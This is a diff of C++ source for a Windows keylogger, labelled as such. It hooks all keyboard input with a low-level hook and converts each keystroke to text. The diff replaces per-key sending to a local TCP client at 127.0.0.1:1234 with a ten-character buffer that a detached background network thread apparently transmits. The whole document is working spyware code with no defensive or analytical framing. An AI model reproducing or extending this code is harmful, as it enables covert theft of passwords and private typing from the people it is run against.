@@ -2,11 +2,11 @@
         KEYLOGGER
     @author EP
 **/
-#include <iostream>
-#include <winsock2.h>
-#include <Windows.h>
-#include <fcntl.h>
-#include <io.h>
+#include<iostream>
+#include<winsock2.h>
+#include<Windows.h>
+#include<fcntl.h>
+#include<io.h>
 #include<string>
 #include<thread>
 #include<fstream>
@@ -15,31 +15,32 @@
 #include<iostream>
 #include<winsock2.h>
 #include<string>
-#include "tcpClient.h"
-
-
+#include<atomic>
+#include "networkControl.h"
+#define DEF_ACC_BUFFER_SIZE 10
 
 
 using namespace std;
 
-// variables used for various purposes all throughout the code
+                                // variables used for various purposes all throughout the code
 HHOOK keyboardHook;
 BYTE keyState[256] = { 0 };
-tcpClient* newClient = new tcpClient("127.0.0.1",(USHORT)1234);
+
 
 
 int cpsLock = -1;
 
 
-
-
 bool dataReady = false;
-bool quitSig = false;
+wstring accBuffer;
+
+mutex m;                    // mutex and condition variable for thread synchronization in networkControl namespace
+condition_variable cv;
+atomic<bool> quit(false);
 
 void cleanUp()
 {
-    wcout<<"[KEYLOGGER] Exiting..."<<endl;
-    newClient->closeConnection();
+    //networkControl::cleanUp();
     UnhookWindowsHookEx(keyboardHook);
     exit(0);
 }
@@ -111,7 +112,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             if ((keyState[VK_PRIOR] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();} 
             break;
         case VK_RETURN:
-            newClient->transmitData("\n");
+            accBuffer = accBuffer + L'\n';
             break;
         default:
             HKL keyboardLayout = GetKeyboardLayout(0);
@@ -123,10 +124,21 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 break;
             }
 
-            wstring wstrUniChar = std::wstring(uniChar);
-            string strUniChar = std::string(wstrUniChar.begin(), wstrUniChar.end());
-            newClient->transmitData(strUniChar);
+            accBuffer = accBuffer + uniChar;
+            
+            if(accBuffer.length() == DEF_ACC_BUFFER_SIZE){
+                wcout << accBuffer<<endl;
+                string s(accBuffer.begin(), accBuffer.end());
+                accBuffer.clear();
 
+                {
+                    std::lock_guard<std::mutex> lock(m);
+                    dataReady = true;
+
+                }
+                cv.notify_one();
+                
+            }
             
 
             break;
@@ -142,10 +154,13 @@ int main()
 
     
     
-    //modification for printing UTF-16 chars to console
-    _setmode(_fileno(stdout), _O_U16TEXT);
+    
+    _setmode(_fileno(stdout), _O_U16TEXT);                                  //modification for printing UTF-16 chars to console
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     MSG msg;
+    wcout<<L"Starting network control thread..."<<endl;
+    thread networkThread(networkControl::networkControlThread, &m, &cv, &dataReady, &accBuffer, &quit); //start network thread
+    networkThread.detach();                             //detach the thread so it runs in the background
 
     //main message loop, does not occupy 100% CPU :D
     while(GetMessage(&msg, NULL, 0, 0))
